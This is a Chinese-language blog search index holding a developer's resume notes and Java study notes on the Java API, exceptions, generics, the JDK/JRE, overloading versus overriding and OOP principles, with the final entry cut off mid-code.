<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>/2023/11/15/Resume/</url>
    <content><![CDATA[<p>异步电路EDA<br>
参与兰州大学异步电路与系统实验室（LZU-ARC）的PinTu项目（面向FPGA ASIC的全异步开源EDA工具链），目前开源到启智平台（OpenI，新一代人工智能开源开放平台）。主要完成对项目源码的部分分析工作，形成介绍文档。对整个项目的整体介绍及部署开源工作。</p>
<p>Gitlet<br>
Gitlet是一个版本控制系统，实现了git的一些特性和功能，相比git在部分功能和实现上进行了简化。支持add、commit、log、checkout、merge等本地仓库操作，同时实现push、fetch、pull等远端仓库命令操作。利用java序列化的方法实现commit和stage对应数据结构的持久化存储，通过sha1算法计算相应的哈希值实现内容可寻址。实现字典树存储commit哈希值，实现根据6位前缀快速查找对应的commit哈希值。</p>
<p>主要包括blob，commit，stage，每一个文件对应一个blob对象，commit和stage分别用于提交和暂存区的对象。</p>
<p>WebServer<br>
实现简易的web服务器，</p>
<p>用户管理、商品管理、订单管理、支付管理、库存管理、物流管理</p>
<p><strong>营销活动平台-抽奖系统</strong><br>
<code>Lottery 抽奖系统</code> 项目是一款互联网面向C端人群营销活动类的抽奖系统，可以提供抽奖活动玩法策略的创建、参与、记账、发奖等逻辑功能。在使用的过程中运营人员通过创建概率类奖品的抽奖玩法，对用户进行拉新、促活、留存，通常这样的系统会用在电商、外卖、出行、公众号运营等各类场景中。</p>
<p>抽奖系统以DDD分层结构的方式，搭建整个抽奖系统架构。抽奖系统是营销平台的重要服务之一，用于，满足C端人群拉新、促活、留存的系统，包括规则引擎、抽奖策略、奖品发放等领域服务。通过规则引擎过滤性别、年龄等各类身份来量化出不同人群可参与的抽奖活动。因活动秒杀的并发场景，将秒杀从数据库行级锁优化为Redis分布式锁。解耦抽奖流程，将抽奖流程和发奖流程通过MQ消息串联起来。实现分库分表，将用户数据拆分到不同的库表中去，减轻数据库压力。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>模块</p>
</li>
<li class="lvl-2">
<p>库存秒杀：Redis分布式锁</p>
</li>
<li class="lvl-2">
<p>规则引擎：</p>
</li>
</ul>
<p>库表设计：关联关系、字段明细、唯一索引、分库分表、数据同步</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/06/03/Java/Java%20API/</url>
    <content><![CDATA[<h1>1 自定义排序</h1>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">largestNumber</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> n=nums.length;</span><br><span class="line">        Integer[] arr=<span class="keyword">new</span> <span class="title class_">Integer</span>[n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            arr[i]=nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//从大到小排序</span></span><br><span class="line">        Arrays.sort(arr,(x,y)-&gt;&#123;</span><br><span class="line">            <span class="type">long</span> sx=<span class="number">10</span>,sy=<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">while</span>(sx&lt;=x)&#123;</span><br><span class="line">                sx=sx*<span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(sy&lt;=y)&#123;sy=sy*<span class="number">10</span>;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (<span class="type">int</span>) (y*sx+x-(x*sy+y));</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(arr[<span class="number">0</span>]==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:arr)&#123;</span><br><span class="line">            sb.append(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>2 数组</h1>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//二维数组</span></span><br><span class="line">List&lt;<span class="type">int</span>[]&gt;[] g=<span class="keyword">new</span> <span class="title class_">ArrayList</span>[n];</span><br><span class="line">Arrays.setAll(g,i-&gt;<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//排序</span></span><br><span class="line"><span class="type">int</span>[][] points;</span><br><span class="line">Arrays.sort(points,(a,b)-&gt;Integer.compare(a[<span class="number">0</span>],b[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>[][] grid;</span><br><span class="line"><span class="type">int</span> m=grid.length,n=grid[<span class="number">0</span>].length;</span><br><span class="line"><span class="type">int</span>[] row=<span class="keyword">new</span> <span class="title class_">int</span>[m];</span><br><span class="line"><span class="type">int</span>[] col=<span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span>[] nums=<span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line"><span class="comment">// Arrays.stream(nums).sum();</span></span><br><span class="line"><span class="type">int</span> n=nums.length;</span><br><span class="line">Arrays.fill(nums,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>,-<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//数组排序</span></span><br><span class="line"><span class="type">int</span>[] nums;</span><br><span class="line">Arrays.sort(nums);</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>操作</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>nums.set(index,last)</td>
<td>设置Index下标元素值</td>
</tr>
<tr>
<td>nums.remove(index)</td>
<td></td>
</tr>
<tr>
<td>nums.size()</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h1>3 List</h1>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//二维数组</span></span><br><span class="line">List&lt;List&lt;Integer&gt;&gt; ans=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&lt;Integer&gt;&gt;();</span><br></pre></td></tr></table></figure>
<h1>4 String</h1>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String s;</span><br><span class="line"><span class="comment">//获取长度</span></span><br><span class="line">s.length();</span><br><span class="line"></span><br><span class="line"><span class="comment">//某一下标字符</span></span><br><span class="line">s.charAt(index);</span><br><span class="line"></span><br><span class="line"><span class="comment">//去掉最后一个字符</span></span><br><span class="line">StringBuilder s=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">s.deleteCharAt(s.length()-<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<h1>5 Map</h1>
<table>
<thead>
<tr>
<th>操作</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>s.containsKey(val)</td>
<td></td>
</tr>
<tr>
<td>s.remove(key)</td>
<td></td>
</tr>
<tr>
<td>s.get(key)</td>
<td></td>
</tr>
</tbody>
</table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;Character, Character&gt; pairs = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Character, Character&gt;() &#123;&#123;</span><br><span class="line">          put(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">          put(<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">          put(<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>);</span><br><span class="line">      &#125;&#125;;</span><br></pre></td></tr></table></figure>
<h1>6 Set</h1>
<table>
<thead>
<tr>
<th>操作</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Set&lt;Character&gt; s=new HashSet()</td>
<td></td>
</tr>
<tr>
<td>s.contains(ch)</td>
<td></td>
</tr>
<tr>
<td>s.add(ch)</td>
<td>s中包含ch，返回false</td>
</tr>
<tr>
<td>s.remove(ch)</td>
<td></td>
</tr>
</tbody>
</table>
<h1>7 Stack</h1>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> Deque&lt;Character&gt; stack=<span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Character&gt;();</span><br><span class="line"> stack.isEmpty()</span><br><span class="line"> stack.peek()</span><br><span class="line"> stack.pop()</span><br><span class="line"> stack.push(ch)</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/04/02/Java/Java(2)%EF%BC%9A%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    <content><![CDATA[<h1>1 序列化、反序列化</h1>
<p>序列化是将数据结构或对象转换成一种可存储或可传输格式的过程，通常涉及将数据转换成字节流或类似的格式，以便在不同平台和编程语言之间进行传输和交换。反序列化是将序列化后的数据重新还原成原始的数据结构或对象，从文件、网络数据或数据库中读取序列化的数据，并将其转换回原始形式，以便在程序中进行使用和操作。这两个概念在编程中与数据存储、传输和处理密切相关，为开发工作带来便利1</p>
<h1>2 异常</h1>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405132023043.png" alt="image.png|500"></p>
<h2 id="2-1-Exception和Error">2.1 Exception和Error</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong><code>Exception</code></strong> :程序本身可以处理的异常，可以通过 <code>catch</code> 来进行捕获。<code>Exception</code> 又可以分为 Checked Exception (受检查异常，必须处理) 和 Unchecked Exception (不受检查异常，可以不处理)。</p>
</li>
<li class="lvl-2">
<p><strong><code>Error</code></strong>：<code>Error</code> 属于程序无法处理的错误</p>
</li>
</ul>
<p><code>RuntimeException</code> 及其子类都统称为非受检查异常，常见的有（建议记下来，日常开发中会经常用到）：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>NullPointerException</code>(空指针错误)</p>
</li>
<li class="lvl-2">
<p><code>IllegalArgumentException</code>(参数错误比如方法入参类型错误)</p>
</li>
<li class="lvl-2">
<p><code>NumberFormatException</code>（字符串转换为数字格式错误，<code>IllegalArgumentException</code>的子类，s包含非数字字符，或者为null）</p>
</li>
<li class="lvl-2">
<p><code>ArrayIndexOutOfBoundsException</code>（数组越界错误）</p>
</li>
<li class="lvl-2">
<p><code>ClassCastException</code>（类型转换错误）</p>
</li>
<li class="lvl-2">
<p><code>ArithmeticException</code>（算术错误）</p>
</li>
<li class="lvl-2">
<p><code>SecurityException</code> （安全错误比如权限不够）</p>
</li>
<li class="lvl-2">
<p><code>UnsupportedOperationException</code>(不支持的操作错误比如重复创建同一用户)</p>
</li>
</ul>
<h3 id="2-1-1-如何使用-try-with-resources-代替try-catch-finally？">2.1.1 如何使用 <code>try-with-resources</code> 代替<code>try-catch-finally</code>？</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//读取文本文件的内容</span></span><br><span class="line"><span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    scanner = <span class="keyword">new</span> <span class="title class_">Scanner</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D://read.txt&quot;</span>));</span><br><span class="line">    <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">        System.out.println(scanner.nextLine());</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (scanner != <span class="literal">null</span>) &#123;</span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用 Java 7 之后的 <code>try-with-resources</code> 语句改造上面的代码:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;test.txt&quot;</span>))) &#123;</span><br><span class="line">    <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">        System.out.println(scanner.nextLine());</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (FileNotFoundException fnfe) &#123;</span><br><span class="line">    fnfe.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>3 泛型</h1>
<blockquote>
<p>在 java 中泛型只是一个占位符，必须在传递类型后才能使用。类在实例化时才能真正的传递类型参数，由于<mark>静态方法的加载先于类的实例化</mark>，也就是说类中的泛型还没有传递真正的类型参数，静态的方法的加载就已经完成了，所以静态泛型方法是没有办法使用类上声明的泛型的。只能使用自己声明的 <code>&lt;E&gt;</code></p>
</blockquote>
<p>泛型一般有三种使用方式:<strong>泛型类</strong>、<strong>泛型接口</strong>、<strong>泛型方法</strong>。</p>
]]></content>
  </entry>
  <entry>
    <title>Java(1)：基础（上）</title>
    <url>/2023/12/11/Java/Java(1)%EF%BC%9A%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    <content><![CDATA[<p>JDK（Java Development Kit），它是功能齐全的 Java SDK，是提供给开发者使用的，能够创建和编译 Java 程序。他包含了 JRE，同时还包含了编译 java 源码的编译器 javac 以及一些其他工具比如 javadoc（文档注释工具）、jdb（调试器）、jconsole（基于 JMX 的可视化监控⼯具）、javap（反编译工具）等等。</p>
<p>JRE（Java Runtime Environment） 是 Java 运行时环境。它是运行已编译 Java 程序所需的所有内容的集合，主要包括 Java 虚拟机（JVM）、Java 基础类库（Class Library）。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202312110953812.png" alt="image.png|425"></p>
<p>Java程序先通过编译生成字节码，在通过Java解释器解释执行。</p>
<p>JIT（即时编译，just in time）<br>
Java通过编译器javac先将源程序编译成与平台无关的Java字节码文件（.class），再由JVM解释执行字节码文件，从而做到平台无关。 但是，有利必有弊。对字节码的解释执行过程实质为：JVM先将字节码翻译为对应的机器指令，然后执行机器指令。很显然，这样经过解释执行，其执行速度必然不如直接执行二进制字节码文件。</p>
<p>而为了提高执行速度，便引入了 JIT 技术。当JVM发现<mark>某个方法或代码块运行特别频繁</mark>的时候，就会认为这是“热点代码”（Hot Spot Code)。然后JIT会把部分“热点代码“编译成本地机器相关的机器码，并进行优化，然后再把编译后的机器码缓存起来，以备下次使用。</p>
<h1>1 基础</h1>
<h2 id="1-1-基本数据类型">1.1 基本数据类型</h2>
<h3 id="1-1-1-primitive-vs-reference">1.1.1 primitive vs reference</h3>
<p>原语变量和引用变量</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>6 种数字类型：</p>
<ul class="lvl-2">
<li class="lvl-6">4 种整数型：<code>byte</code>、<code>short</code>、<code>int</code>、<code>long</code></li>
<li class="lvl-6">2 种浮点型：<code>float</code>、<code>double</code></li>
</ul>
</li>
<li class="lvl-2">
<p>1 种字符类型：<code>char</code></p>
</li>
<li class="lvl-2">
<p>1 种布尔型：<code>boolean</code>。</p>
</li>
</ul>
<p>基本数据类型的存储位置取决于它们的作用域和声明方式。如果它们是局部变量，那么它们会存放在栈中；如果它们是成员变量，那么它们会存放在堆中。</p>
<h3 id="1-1-2-自动装箱与拆箱">1.1.2 自动装箱与拆箱</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>装箱</strong>：将基本类型用它们对应的引用类型包装起来；</p>
</li>
<li class="lvl-2">
<p><strong>拆箱</strong>：将包装类型转换为基本数据类型；</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span>;  <span class="comment">//装箱</span></span><br><span class="line"><span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> i;   <span class="comment">//拆箱</span></span><br><span class="line"></span><br><span class="line"><span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span> 等价于 <span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> Integer.valueOf(<span class="number">10</span>)</span><br><span class="line"><span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> i 等价于 <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> i.intValue();</span><br></pre></td></tr></table></figure>
<h3 id="1-1-3-浮点数运算的精度丢失">1.1.3 浮点数运算的精度丢失</h3>
<p><code>BigDecimal</code> 可以实现对浮点数的运算，不会造成精度丢失。通常情况下，大部分需要浮点数精确运算结果的业务场景（比如涉及到钱的场景）都是通过 <code>BigDecimal</code> 来做的。<br>
<a href="https://javaguide.cn/java/basis/bigdecimal.html">BigDecimal 详解</a></p>
<h2 id="1-2-变量">1.2 变量</h2>
<h3 id="1-2-1-成员变量与局部变量的区别？">1.2.1 成员变量与局部变量的区别？</h3>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405291046978.png" alt="image.png"></p>
<p>成员变量 vs 局部变量</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>语法形式</strong>：从语法形式上看，成员变量是属于类的，而局部变量是在代码块或方法中定义的变量或是方法的参数；成员变量可以被 <code>public</code>,<code>private</code>,<code>static</code> 等修饰符所修饰，而局部变量不能被访问控制修饰符及 <code>static</code> 所修饰；但是，成员变量和局部变量都能被 <code>final</code> 所修饰。</p>
</li>
<li class="lvl-2">
<p><strong>存储方式</strong>：从变量在内存中的存储方式来看，如果成员变量是使用 <code>static</code> 修饰的，那么这个成员变量是属于类的，如果没有使用 <code>static</code> 修饰，这个成员变量是属于实例的。而对象存在于堆内存，局部变量则存在于栈内存。</p>
</li>
<li class="lvl-2">
<p><strong>生存时间</strong>：从变量在内存中的生存时间上看，成员变量是对象的一部分，它随着对象的创建而存在，而局部变量随着方法的调用而自动生成，随着方法的调用结束而消亡。</p>
</li>
<li class="lvl-2">
<p><strong>默认值</strong>：从变量是否有默认值来看，成员变量如果没有被赋初始值，则会自动以类型的默认值而赋值（一种情况例外:被 <code>final</code> 修饰的成员变量也必须显式地赋值），而局部变量则不会自动赋值。</p>
</li>
</ul>
<h2 id="1-3-关键字">1.3 关键字</h2>
<p>被 <code>final</code> 关键字修饰的类不能被继承，修饰的方法不能被重写，修饰的变量是基本数据类型则值不能改变，修饰的变量是引用类型则不能再指向其他对象。</p>
<h2 id="1-4-方法">1.4 方法</h2>
<h3 id="1-4-1-静态方法为什么不能调用非静态成员">1.4.1 静态方法为什么不能调用非静态成员?</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>静态方法是属于类的，在类加载的时候就会分配内存，可以通过类名直接访问。而非静态成员属于实例对象，只有在对象实例化之后才存在，需要通过类的实例对象去访问。</p>
</li>
<li class="lvl-2">
<p>在类的非静态成员不存在的时候静态方法就已经存在了，此时调用在内存中还不存在的非静态成员，属于非法操作</p>
</li>
</ul>
<h3 id="1-4-2-overload-重载-和override-重写">1.4.2 overload(重载)和override(重写)</h3>
<p><a href="https://www.runoob.com/java/java-override-overload.html">Java 重写(Override)与重载(Overload) | 菜鸟教程 (runoob.com)</a></p>
<blockquote>
<p>重载就是同样的一个方法能够根据输入数据的不同，做出不同的处理重写就是当子类继承自父类的相同方法，输入数据一样，但要做出有别于父类的响应时，你就要覆盖父类方法</p>
</blockquote>
<h4 id="重载">重载</h4>
<p>发生在同一个类中（或者父类和子类之间），方法名必须相同，参数类型不同、个数不同、顺序不同，方法返回值和访问修饰符可以不同。重载就是<mark>同一个类中多个同名方法根据不同的传参来执行不同的逻辑处理</mark>。</p>
<p>重载(overloading) 是在一个类里面，方法名字相同，而参数不同。返回类型可以相同也可以不同。每个重载的方法（或者构造函数）都必须有一个独一无二的参数类型列表。</p>
<h4 id="重写">重写</h4>
<p>重写（Override）是指子类定义了一个与其父类中具有相同名称、参数列表和返回类型的方法，并且子类方法的实现覆盖了父类方法的实现。 <strong>即外壳不变，核心重写！</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>参数列表与被重写方法的参数列表必须完全相同。</p>
</li>
<li class="lvl-2">
<p>返回类型与被重写方法的返回类型可以不相同，但是必须是父类返回值的派生类（java5 及更早版本返回类型要一样，java7 及更高版本可以不同）。</p>
</li>
</ul>
<p>重写发生在运行期，是子类对父类的允许访问的方法的实现过程进行重新编写。</p>
<ol>
<li class="lvl-3">
<p>方法名、参数列表必须相同，子类方法返回值类型应比父类方法返回值类型更小或相等，抛出的异常范围小于等于父类，访问修饰符范围大于等于父类。</p>
</li>
<li class="lvl-3">
<p>如果父类方法访问修饰符为 <code>private/final/static</code> 则子类就不能重写该方法，但是被 <code>static</code> 修饰的方法能够被再次声明。</p>
</li>
<li class="lvl-3">
<p>构造方法无法被重写</p>
</li>
</ol>
<p>综上：<strong>重写就是子类对父类方法的重新改造，外部样子不能改变，内部逻辑可以改变。</strong></p>
<table>
<thead>
<tr>
<th>区别点</th>
<th>重载方法</th>
<th>重写方法</th>
</tr>
</thead>
<tbody>
<tr>
<td>发生范围</td>
<td>同一个类</td>
<td>子类</td>
</tr>
<tr>
<td>参数列表</td>
<td>必须修改</td>
<td>一定不能修改</td>
</tr>
<tr>
<td>返回类型</td>
<td>可修改</td>
<td>子类方法返回值类型应比父类方法返回值类型更小或相等</td>
</tr>
<tr>
<td>异常</td>
<td>可修改</td>
<td>子类方法声明抛出的异常类应比父类方法声明抛出的异常类更小或相等；</td>
</tr>
<tr>
<td>访问修饰符</td>
<td>可修改</td>
<td>一定不能做更严格的限制（可以降低限制）</td>
</tr>
<tr>
<td>发生阶段</td>
<td>编译期</td>
<td>运行期</td>
</tr>
</tbody>
</table>
<h1>2 面向对象基础</h1>
<h3 id="2-1-1-面向对象和面向过程的区别">2.1.1 面向对象和面向过程的区别</h3>
<p>两者的主要区别在于解决问题的方式不同：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>面向过程把解决问题的过程拆成一个个方法，通过一个个方法的执行解决问题。</p>
</li>
<li class="lvl-2">
<p>面向对象会先抽象出对象，然后用对象执行方法的方式解决问题。</p>
</li>
</ul>
<p>另外，面向对象开发的程序一般更易维护、易复用、易扩展。</p>
<h3 id="2-1-2-对象的相等和引用相等的区别">2.1.2 对象的相等和引用相等的区别</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>对象的相等一般比较的是内存中存放的内容是否相等。</p>
</li>
<li class="lvl-2">
<p>引用相等一般比较的是他们指向的内存地址是否相等。</p>
</li>
</ul>
<h2 id="2-2-构造方法">2.2 构造方法</h2>
<blockquote>
<p>如果一个类没有声明构造方法，会有默认的不带参数的构造方法。如果我们自己添加了类的构造方法（无论是否有参），Java 就不会添加默认的无参数的构造方法了。</p>
</blockquote>
<p>构造方法不能被 override（重写）,但是可以 overload（重载）,所以你可以看到一个类中有多个构造函数的情况。</p>
<h2 id="2-3-面向对象三大特性">2.3 面向对象三大特性</h2>
<h3 id="2-3-1-封装">2.3.1 封装</h3>
<p>encapsulation：实例变量(instance variable)不能直接访问修改</p>
<blockquote>
<p>封装是指把一个对象的状态信息（也就是属性）隐藏在对象内部，不允许外部对象直接访问对象的内部信息。但是可以提供一些可以被外界访问的方法来操作属性。</p>
</blockquote>
<h3 id="2-3-2-继承">2.3.2 继承</h3>
<blockquote>
<p>Java 的类不可以多继承，但是接口可以多继承。</p>
</blockquote>
<p>inheritance：IS-A</p>
<p>继承是使用已存在的类的定义作为基础建立新类的技术，新类的定义可以增加新的数据或新的功能，也可以用父类的功能，但不能选择性地继承父类。通过使用继承，可以快速地创建新的类，可以提高代码的重用，程序的可维护性，节省大量创建新类的时间 ，提高我们的开发效率。</p>
<ol>
<li class="lvl-4">
<p>子类拥有父类对象所有的属性和方法（包括私有属性和私有方法），但是父类中的私有属性和方法子类是无法访问，<strong>只是拥有</strong>。</p>
</li>
<li class="lvl-3">
<p>子类可以拥有自己属性和方法，即子类可以对父类进行扩展。</p>
</li>
<li class="lvl-3">
<p>子类可以用自己的方式实现父类的方法。</p>
</li>
</ol>
<h3 id="2-3-3-多态">2.3.3 多态</h3>
<blockquote>
<p>概念：同一操作作用于不同的对象，可以有不同的解释，产生不同的执行结果，这就是多态性。简单的说:就是用基类的引用指向子类的对象。</p>
</blockquote>
<p>polymorphism：父类引用变量引用子类，让不同的子类进行相同的行为</p>
<blockquote>
<p>一个对象具有多种的状态，具体表现为父类的引用指向子类的实例。</p>
</blockquote>
<p><strong>多态的特点:</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>对象类型和引用类型之间具有继承（类）/实现（接口）的关系；</p>
</li>
<li class="lvl-2">
<p>引用类型变量发出的方法调用的到底是哪个类中的方法，必须在程序运行期间才能确定；</p>
</li>
<li class="lvl-2">
<p>多态不能调用“只在子类存在但在父类不存在”的方法；</p>
</li>
<li class="lvl-2">
<p>如果子类重写了父类的方法，真正执行的是子类覆盖的方法，如果子类没有覆盖父类的方法，执行的是父类的方法。</p>
</li>
</ul>
<blockquote>
<p>多态的目的是为了提高程序的可扩展性，解决项目中紧耦合的问题，提高代码的复用性。多态可以让程序员针对抽象而不是具体实现来编程，这样的代码会有更好的可扩展性。通过使用多态，可以将具体的实现细节隐藏在抽象的接口或基类中，使得代码更加高层次和抽象化2。这种解耦合的设计可以提高代码的可读性和可维护性2。</p>
</blockquote>
<ol>
<li class="lvl-3">
<p><strong>封装（Encapsulation）：</strong></p>
<ul class="lvl-2">
<li class="lvl-6">封装是面向对象编程的基本原则之一。它将类的实现细节隐藏起来，只向外部暴露必要的接口和数据。通过封装，对象内部的实现细节对外部是不可见的，这提高了代码的安全性和可维护性。封装可以通过访问修饰符（如private、protected、public）来实现，同时提供公共的方法来访问或修改私有属性。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>继承（Inheritance）：</strong></p>
<ul class="lvl-2">
<li class="lvl-6">继承是一种通过重用现有类的属性和方法来创建新类的机制。子类继承父类的特性，可以使用父类中的方法和属性，同时可以在子类中扩展或修改这些方法和属性。继承实现了代码的重用，提高了代码的可维护性。Java中通过关键字<code>extends</code>来实现继承关系。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>多态（Polymorphism）：</strong></p>
<ul class="lvl-2">
<li class="lvl-6">多态是指同一个操作作用于不同的对象可以有不同的行为。多态提高了代码的灵活性和可扩展性。Java中有两种类型的多态：编译时多态（静态多态）和运行时多态（动态多态）。运行时多态是通过方法的重写（Override）和接口来实现的。编译时多态是通过方法的重载（Overload）来实现的。多态是面向对象编程中一个非常重要的概念，它使得程序更容易扩展和维护。</li>
</ul>
</li>
</ol>
<p><a href="https://www.cnblogs.com/hai-ping/articles/2807750.html">什么是多态?为什么用多态?有什么好处?多态在什么地方用？ - 技术_菜鸟 - 博客园 (cnblogs.com)</a></p>
<h2 id="2-4-接口和抽象类">2.4 接口和抽象类</h2>
<p><strong>共同点</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>都不能被实例化。</p>
</li>
<li class="lvl-2">
<p>都可以包含抽象方法。</p>
</li>
<li class="lvl-2">
<p>都可以有默认实现的方法（Java 8 可以用 <code>default</code> 关键字在接口中定义默认方法）。</p>
</li>
</ul>
<p><strong>区别</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>接口主要用于对类的行为进行约束，你实现了某个接口就具有了对应的行为。抽象类主要用于代码复用，强调的是所属关系。</p>
</li>
<li class="lvl-2">
<p>一个类只能继承一个类，但是可以实现多个接口。</p>
</li>
<li class="lvl-2">
<p>接口中的成员变量只能是 <code>public static final</code> 类型的，不能被修改且必须有初始值，而抽象类的成员变量默认 default，可在子类中被重新定义，也可被重新赋值</p>
</li>
</ul>
<h3 id="2-4-1-抽象类">2.4.1 抽象类</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>抽象类不能被实例化</p>
</li>
<li class="lvl-2">
<p>可以没有抽象方法</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//抽象类可以有抽象方法和普通方法，但抽象方法不能有body</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">bark</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sleep&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bark</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span 